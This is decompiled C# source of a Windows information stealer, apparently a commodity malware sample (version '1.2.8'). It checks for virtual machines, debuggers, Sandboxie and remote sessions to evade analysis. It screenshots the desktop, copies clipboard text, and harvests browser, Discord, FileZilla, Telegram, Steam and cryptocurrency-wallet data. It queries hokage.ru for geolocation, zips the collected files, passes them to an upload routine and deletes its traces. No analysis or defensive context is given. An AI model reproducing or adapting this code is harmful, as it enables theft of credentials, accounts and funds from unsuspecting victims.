using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stealer
{
	// Token: 0x0200000C RID: 12
	public class Program
	{
		// Token: 0x0600003F RID: 63 RVA: 0x00004F54 File Offset: 0x00003154
		[STAThread]
		private static void Main(string[] args)
		{
			if (Program.GetCheckVMBot())
			{
				Environment.Exit(0);
			}
			StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			Directory.CreateDirectory(Program.path);
			streamWriter.WriteLine("Created directory");
			Class4.SaveScreen(Program.path + "\\image.png");
			streamWriter.WriteLine("SaveScreen");
			streamWriter.WriteLine("[Browsers Started]");
			streamWriter.Close();
			Class2.smethod_0(Program.path + "\\Browsers");
			streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			streamWriter.WriteLine("[Browser End]");
			Class4.Discord(Program.path + "\\Discord");
			streamWriter.WriteLine("Discord");
			Class4.FileZilla(Program.path + "\\FileZilla");
			streamWriter.WriteLine("FileZilla");
			Class4.Telegram(Program.path + "\\Telegram");
			streamWriter.WriteLine("Telegram");
			Class4.Steam(Program.path + "\\Steam");
			streamWriter.WriteLine("Steam");
			Class4.smethod_3(Program.path + "\\Wallets");
			streamWriter.WriteLine("Wallets");
			try
			{
				using (WebClient webClient = new WebClient())
				{
					byte[] bytes = webClient.DownloadData("http://hokage.ru/antivirus.php");
					Program.geo = Encoding.ASCII.GetString(bytes);
				}
			}
			catch
			{
				Program.geo = "Unknown?Unknown?Unknown?UN";
			}
			streamWriter.WriteLine("Geo");
			Class4.smethod_0(Program.path + "\\info.txt");
			try
			{
				string text = string.Concat(new string[]
				{
					Program.string_1,
					"\\[",
					Program.geo.Split(new char[]
					{
						'?'
					})[3],
					"]",
					Program.geo.Split(new char[]
					{
						'?'
					})[0],
					"_",
					Class6.smethod_0(),
					".zip"
				});
				Class6.smethod_3(Program.path, text);
				Class6.smethod_4(text, Program.id, string.Concat(new string[]
				{
					"[",
					Program.geo.Split(new char[]
					{
						'?'
					})[3],
					"]",
					Program.geo.Split(new char[]
					{
						'?'
					})[0],
					"_",
					Class6.smethod_0()
				}));
				Directory.Delete(Program.path, true);
				Directory.Delete(Program.string_1, true);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000521C File Offset: 0x0000341C
		private static bool smethod_0()
		{
			bool result;
			Program.mutex_0 = new Mutex(true, "dwdwcwcwwfgg", ref result);
			return result;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x0000523C File Offset: 0x0000343C
		private static bool smethod_1()
		{
			using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					try
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						bool flag = managementBaseObject["Model"].ToString().ToLower().Contains("virtual");
						if ((text.Equals("microsoft corporation") && flag) || text.Contains("vmware") || managementBaseObject["Model"].ToString().Equals("VirtualBox"))
						{
							return true;
						}
					}
					catch (Exception)
					{
						return false;
					}
				}
			}
			return false;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00005340 File Offset: 0x00003540
		private static bool smethod_2(Process process_0)
		{
			bool result;
			try
			{
				bool flag = false;
				Class1.CheckRemoteDebuggerPresent(process_0.Handle, ref flag);
				result = flag;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002336 File Offset: 0x00000536
		private static bool smethod_3()
		{
			return SystemInformation.TerminalServerSession;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00005378 File Offset: 0x00003578
		private static bool TiHzamps7()
		{
			return Process.GetProcessesByName("wsnm").Length != 0 || Class1.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00002343 File Offset: 0x00000543
		public static bool GetCheckVMBot()
		{
			return Program.smethod_2(Process.GetCurrentProcess()) || Program.TiHzamps7() || Program.smethod_3() || Program.smethod_1();
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000224C File Offset: 0x0000044C
		public Program()
		{
			Class13.Cyiv2R6zubiV2();
			base..ctor();
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000053AC File Offset: 0x000035AC
		// Note: this type is marked as 'beforefieldinit'.
		static Program()
		{
			Class13.Cyiv2R6zubiV2();
			Program.string_0 = "";
			Program.version = "1.2.8";
			Program.timestart = DateTime.Now.ToString();
			Program.timerint = 0;
			Program.clipp = ((Clipboard.GetText().Length <= 0 || Clipboard.GetText().Length >= 300) ? "" : Clipboard.GetText());
			Program.geo = "";
			Program.path2 = "C:\\ProgramData\\debug.txt";
			Program.string_1 = Environment.GetEnvironmentVariable("LocalAppData") + "\\" + Class6.smethod_0();
			Program.path = Program.string_1 + "\\omgsh";
			Program.id = "";
		}

		// Token: 0x04000015 RID: 21
		public static Thread s;

		// Token: 0x04000016 RID: 22
		private static string string_0;

		// Token: 0x04000017 RID: 23
		public static string version;

		// Token: 0x04000018 RID: 24
		public static string timestart;

		// Token: 0x04000019 RID: 25
		public static int timerint;

		// Token: 0x0400001A RID: 26
		public static string clipp;

		// Token: 0x0400001B RID: 27
		public static string geo;

		// Token: 0x0400001C RID: 28
		public static string path2;

		// Token: 0x0400001D RID: 29
		private static string string_1;

		// Token: 0x0400001E RID: 30
		public static string path;

		// Token: 0x0400001F RID: 31
		public static string id;

		// Token: 0x04000020 RID: 32
		private static Mutex mutex_0;
	}
}
